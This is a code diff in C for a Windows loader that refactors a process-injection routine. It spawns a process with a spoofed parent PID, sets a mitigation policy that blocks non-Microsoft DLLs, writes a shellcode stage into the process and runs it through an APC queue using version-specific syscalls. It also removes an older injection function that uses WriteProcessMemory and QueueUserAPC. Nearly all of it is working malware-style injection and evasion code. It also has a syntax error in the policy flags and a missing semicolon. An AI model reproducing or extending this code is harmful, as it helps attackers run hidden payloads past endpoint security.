@@ -69,12 +69,17 @@ CHAR* GetParentHandle(HANDLE* hProcess)
     return PreferProcChain[iter][1];
 }
 
-void SpawnProcess(HANDLE hProcess, CHAR* ProcessName, HANDLE* cProc, HANDLE* cThread, CHAR* Stage, DWORD sSize)
+void SpawnAndInject(HANDLE hProcess, CHAR* ProcessName, HANDLE* cProc, HANDLE* cThread, CHAR* Stage, DWORD sSize)
 {
-    // our start up info
+    // Spawn the new process with ppid spoofing and inject the stage into it.
+
     SIZE_T attribSize;
+    ULONG oProc, nProc;
     STARTUPINFOEXA sInfo;
+    LPVOID rBuffer = NULL;
+    OSVERSIONINFOEXW osInfo;
     PROCESS_INFORMATION pInfo;
+	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
 
     // zero out our mem just to be safe
     ZeroMemory(&sInfo, sizeof(STARTUPINFOEXA));
@@ -85,8 +90,8 @@ void SpawnProcess(HANDLE hProcess, CHAR* ProcessName, HANDLE* cProc, HANDLE* cTh
     InitializeProcThreadAttributeList(sInfo.lpAttributeList, 2, 0, &attribSize);
 
     // our protection policys
-    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
-                    //  PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
+    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON \
+                     PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
     UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
 
     // ppid spoof
@@ -95,21 +100,14 @@ void SpawnProcess(HANDLE hProcess, CHAR* ProcessName, HANDLE* cProc, HANDLE* cTh
     // set the size of the struct
     sInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
     
-    // start the process
-    // use syscall
-    // spawn svchost.exe with a different ppid an jus start it running
+    // start the process. TODO: use syscall
     CreateProcessA(ProcessName, NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
 
-    // alloc the memory we need inside the process
-    LPVOID rBuffer = NULL;
-    ULONG oProc, nProc;
+    // alloc the memory we need inside the process. TODO: use syscall
     rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
 
-    OSVERSIONINFOEXW osInfo;
-	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
-
+    // get RtlGetVersion export and call it to get our version info
     RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");
-
     RtlGetVersion(&osInfo);
     
     // make sure we are using the correct syscall numbers, probly a nicer way of doing this
@@ -132,62 +130,7 @@ void SpawnProcess(HANDLE hProcess, CHAR* ProcessName, HANDLE* cProc, HANDLE* cTh
     // execute the code inside the process
     NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
 
-    // give the return values
-    *cProc = pInfo.hProcess;
-    *cThread = pInfo.hThread;
-
     return;
-}
-
-VOID InjectProcess(HANDLE cProc, HANDLE cThread, CHAR* Stage, DWORD sSize)
-{
-    ULONG oProc, nProc;
-    LPVOID rBuffer = NULL;
-    OSVERSIONINFOEXW osInfo;
-	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
-
-    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");
-
-    RtlGetVersion(&osInfo);
-
-	HANDLE remoteThread;
-	PVOID remoteBuffer;
-
-	// remoteBuffer = VirtualAllocEx(cProc, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-	// WriteProcessMemory(cProc, remoteBuffer, Stage, sSize, NULL);
-	// remoteThread = CreateRemoteThread(cProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-	// CloseHandle(cProc);
-
-    remoteBuffer = VirtualAllocEx(cProc, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(cProc, remoteBuffer, Stage, sSize, NULL);
-    DWORD dwResult = QueueUserAPC((PAPCFUNC)remoteBuffer, cProc, NULL);
-
-    // alloc the memory we need inside the process
-    // rBuffer = VirtualAllocEx(cProc, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-
-    // WriteProcessMemory(cProc, rBuffer, Stage, sSize, NULL);
-
-    // DWORD dwResult = QueueUserAPC((PAPCFUNC)rBuffer, cThread, NULL);
-    
-    // // make sure we are using the correct syscall numbers, probly a nicer way of doing this
-    // if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
-    // {
-    //     NtQueueApcThread     = &NtQueueApcThread10;
-    //     NtWriteVirtualMemory = &NtWriteVirtualMemory10;
-    // } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
-    // {
-    //     NtQueueApcThread     = &NtQueueApcThread81;
-    //     NtWriteVirtualMemory = &NtWriteVirtualMemory81;
-    // }
-
-    // // write our shellcode bytes to the process
-    // NtWriteVirtualMemory(cProc, rBuffer, Stage, sSize, NULL);
-
-    // // change the permisions on the memory so we can execute it
-    // // VirtualProtectEx(cProc, rBuffer, sSize, PAGE_EXECUTE_READWRITE, &oProc);
-
-    // // execute the code inside the process
-    // NtQueueApcThread(cThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
 }
 
 VOID ExecuteStage(CHAR* Stage, DWORD sSize)
@@ -212,11 +155,7 @@ VOID ExecuteStage(CHAR* Stage, DWORD sSize)
         ChildProcess = GetParentHandle(&hProcess);
 
         // spawn the ppid spoofed process
-        SpawnProcess(hProcess, ChildProcess, &cProc, &cThread, Stage, sSize);
-
-        // inject the code into the process
-        // InjectProcess(cProc, cThread, Stage, sSize);
-    
+        SpawnAndInject(hProcess, ChildProcess, &cProc, &cThread, Stage, sSize)
     #endif
 
     return;
